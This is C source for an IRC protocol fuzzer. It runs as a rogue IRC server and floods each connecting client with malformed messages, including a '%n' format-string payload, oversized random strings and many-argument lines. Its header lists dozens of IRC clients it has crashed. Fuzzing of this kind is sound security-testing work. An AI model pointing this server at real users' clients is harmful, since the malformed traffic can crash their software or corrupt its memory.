/*
 * ircfuzz v 0.3 by Ilja van Sprundel. 
 * so far this broke: 	- BitchX (1.1-final)
 *			- mIRC (6.16)
 *               	- xchat (2.4.1)
 *		 	- kvirc (3.2.0)
 * 		 	- ircii (ircii-20040820)
 * 		 	- eggdrop (1.6.17)
 *		 	- epic-4 (2.2)
 * 		 	- ninja (1.5.9pre12)
 *		 	- emech (2.8.5.1)
 * 		 	- Virc (2.0 rc5)
 *		 	- TurboIRC (6)
 *		 	- leafchat (1.761)
 *		 	- iRC (0.16)
 *               	- conversation (2.14)
 *		 	- colloquy (2.0 (2D16))
 *		 	- snak (5.0.2) 
 *		 	- ircle (3.1.2)
 *		 	- ircat (2.0.3)
 *			- darkbot (7f3)
 *			- bersirc (2.2.13)
 * 			- Scrollz (1.9.5)
 *			- IM2
 *			- pirch98
 *			- trillian (3.1)
 *			- microsoft comic chat (2.5)
 *			- icechat (5.50)
 *			- centericq (4.20.0)
 *			- uirc (1.3)
 *			- weechat (0.1.3)
 * 			- rhapsody (0.25b)
 *			- kmyirc (0.2.9)
 *			- bnirc (0.2.9)
 *			- bobot++ (2.1.8)
 *			- kwirc (0.1.0)
 * 			- nwirc (0.7.8)
 *			- kopete (0.9.2)
 * 
 *               	- irssi, didn't really break yet, 
 *               	  but it would seem the author has 
 *               	  never heard of free(), major 
 *               	  memory leaks :), same goes for chatzilla
 *
 * 			centericq was a real pita to get automated fuzzing working
 */

#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <signal.h>
#include <unistd.h>
#include <errno.h>
#include <stdarg.h>
#include <string.h>

static int init;
static char arr[] =
  "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%^*()_-+={}[]\\|<>,.:;'\"";

static char *Nnick;

char *strings[] =
  { "JOIN", "PRIVMSG", "KICK", "NOTICE", "NICK", "MODE", "TOPIC", "INVITE", "USER", "PASS", "OPER",
  "NAMES", "LIST", "STATS", "PART", "WHO", "WHOIS", "WHOWAS", "PING", "PONG", "SQUERY", NULL };

// 25
char *submsg[] =
  { "DCC SEND", "DCC CHAT", "DCC XMIT", "DCC OFFER", "XDCC LIST", "XDCC SEND", "FINGER", "VERSION", 
    "USERINFO", "CLIENTINFO", "TIME", "FINGER", "PING", "CDCC SEND", "CDCC LIST", "CDCC XMIT", 
    "XDCC XMIT", "DCC LIST", "XDCC OFFER", "XDCC CHAT", "CDCC OFFER", "CDCC OFFER", "DCC", "XDCC", "CDCC", NULL };

int
getseed (void)
{
  int fd = open ("/dev/urandom", O_RDONLY);
  int r;
  if (fd < 0)
    {
      perror ("open");
      exit (0);
    }
  read (fd, &r, sizeof (r));
  close (fd);
  return (r);
}

int
netprintf (int sock, char *format, ...)
{

  va_list arglist;

  static char buffer[500000];

  va_start (arglist, format);
  vsnprintf (buffer, sizeof (buffer) - 1, format, arglist);
  va_end (arglist);
  return send (sock, buffer, strlen (buffer), 0);
}

char *
gen_hostname ()
{
  static char b[1500];
  int len = rand () % 1500 / ((rand () % 3) + 1);
  memset (b, 'a', len);
  b[len] = '\0';
  return b;
}

char *
gen_submsg ()
{
  if (rand () % 26)
    {
      return submsg[rand () % 25];
    }
  else
    {
      return "";
    }
}

char *
gen_command ()
{
  static char t[1200];
  int len;
  if (rand () % 23)
    {
      return strings[rand () % 22];
      /* raw 100000...1 */
    }
  else
    {
      len = (rand () % 1000) + 2;
      t[0] = '1';
      memset (t + 1, '0', len - 2);
      t[len - 1] = '1';
      t[len] = '\0';
      return t;
    }
}

void
fuzz (int fd)
{
  char buf[100000];
  int raw = rand () % 1000, end, i, a, al;
  if (!(rand () % 10))
    raw = -raw;

  switch (rand () % 5)
    {
    case 0:			// long string 
      end = (rand () % 12000) + 10;
      for (i = 0; i < end; i++)
	{
	  do
	    {
	      buf[i] = rand () % 256;
	    }
	  while (buf[i] == '\n' || buf[i] == '\r' || buf[i] == '\0');
	}
      break;
    case 1:			// fmtbug
      strcpy (buf, "%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n");
      break;
    case 2:			// lots of arguments 
      a = (rand () % 230) + 20;
      al = (rand () % 750) / a;
      buf[0] = '\0';
      for (i = 0; i < a; i++)
	{
	  char t[100];
	  int j = 0;
	  for (j = 0; j < al; j++)
	    t[j] = arr[rand () % sizeof (arr)];
	  t[j] = '\0';
	  strcat (buf, t);
	  strcat (buf, " ");
	}
      break;
    case 3:			// long alpha str
      end = (rand () % 12000) + 10;
      for (i = 0; i < end; i++)
	{
	  buf[i] = arr[rand () % sizeof (arr)];
	}
      buf[i] = '\0';
      break;
    case 4:			// random stuff, random length
      end = (rand () % 2500);
      sprintf (buf, ":aaa %d ", raw);
      al = strlen (buf);
      for (i = 0; i < end; i++)
	buf[i + al] = rand () % 256;
      buf[i + al] = '\r';
      buf[i + al + 1] = '\n';
      write (fd, buf, i + al + 2);
      return;
//              case 5: // long str with 0bytes 
    }

  if (rand () % 5)
    netprintf (fd, ":%s %03d %s :%s%s", gen_hostname (), raw, Nnick, buf,
	       (rand () % 100) ? "\r\n" : "");
  else if (rand () % 3)
    netprintf (fd, ":%s %s %s :%s%s", gen_hostname (), gen_command (), Nnick,
	       buf, (rand () % 100) ? "\r\n" : "");
  else
    netprintf (fd, ":%s %s %s :\x01%s %s%s%s", gen_hostname (), "PRIVMSG",
	       Nnick, gen_submsg (), buf, (rand () % 20) ? "\x01" : "",
	       (rand () % 100) ? "\r\n" : "");
  return;
}

int
main (int argc, char **argv)
{
  int fd, r, s, cfd, i, nick = 0, user = 0, port = 6667;
  char buf[1024];
  struct timeval tv;
  fd_set fds;
  struct sockaddr_in sin;
  signal (SIGPIPE, SIG_IGN);
  fd = socket (AF_INET, SOCK_STREAM, IPPROTO_TCP);
  if (fd < 0)
    {
      perror ("socket()");
      exit (0);
    }
  sin.sin_family = AF_INET;
  if (argc >= 2)
    port = atoi (argv[1]);
  sin.sin_port = htons (port);
  sin.sin_addr.s_addr = inet_addr ("0.0.0.0");
  r = bind (fd, (struct sockaddr *) &sin, sizeof (sin));
  if (r < 0)
    {
      perror ("bind()");
      exit (0);
    }
  listen (fd, 5);
  s = sizeof (sin);
  srand (getseed ());
//LOOP:
  while (1)
    {
      cfd = accept (fd, NULL, &s);
      fcntl (cfd, F_SETFL, O_NONBLOCK);


      do
	{
	  char *t;
	  FD_ZERO (&fds);
	  FD_SET (cfd, &fds);
	  tv.tv_usec = 10000;
	  tv.tv_sec = 0;
	  select (cfd + 1, &fds, NULL, NULL, &tv);
	  if (FD_ISSET (cfd, &fds))
	    {
	      r = read (cfd, buf, sizeof (buf));
	      if (r <= 0)
		{
		  close (cfd);
		  if (Nnick)
		    {
		      free (Nnick);
		      Nnick = NULL;
		    }
		  //goto LOOP;
		  init = 0;
		  user = 0;
		  nick = 0;
		  break;
		}
	      buf[1023] = '\0';
	      // printf("got: %s\n", buf);
	      for (i = 0; i < 1024; i++)
		if (buf[i] == '\n')
		  {
		    buf[i] = '\0';
		    t = buf + i + 1;
		    break;
		  }
	      if (!init)
		{
		  if (!strncasecmp (buf, "NICK", 4))
		    {
		      char *p;
		      p = buf + 4;
		      while (*p != '\0' && *p != '\r')
			p++;
		      *p = '\0';
		      Nnick = strdup (buf + 4);
		      nick++;
		      /* hack I had to put in for xchat, should rewrite this little parser */
		      if (*t++ == 'U' &&
			  *t++ == 'S' && *t++ == 'E' && *t++ == 'R')
			{
			  user++;
			}
		    }
		  else if (!strncmp (buf, "USER", 4))
		    {
		      user++;
		      /* stupid ezbounce */
		      if (*t++ == 'N' &&
			  *t++ == 'I' && *t++ == 'C' && *t++ == 'K')
			{
			  nick++;
			  t++;
			  Nnick = strdup (t);
			}
		    }
		  if (nick && user)
		    {
		      init++;
		      netprintf (cfd, ":aaa 001 %s :a\r\n"
				 ":aaa 002 %s :a\r\n"
				 ":aaa 003 %s :a\r\n"
				 ":aaa 004 %s :a\r\n"
				 ":aaa 005 %s :a\r\n"
				 ":aaa 251 %s :a\r\n"
				 ":aaa 252 %s :a\r\n"
				 ":aaa 253 %s :a\r\n"
				 ":aaa 254 %s :a\r\n"
				 ":aaa 255 %s :a\r\n"
				 ":aaa 375 %s :a\r\n"
				 ":aaa 372 %s :a\r\n"
				 ":aaa 376 %s :a\r\n", Nnick, Nnick, Nnick,
				 Nnick, Nnick, Nnick, Nnick, Nnick, Nnick,
				 Nnick, Nnick, Nnick, Nnick);

		    }
		}
	      // else {} // might need this later 
	    }
	  if (init)
	    {
	      /*
	       * only raw's for now
	       * will need to add more stuff later    
	       */
	      fuzz (cfd);
	    }

	}
      while (1);
    }
}
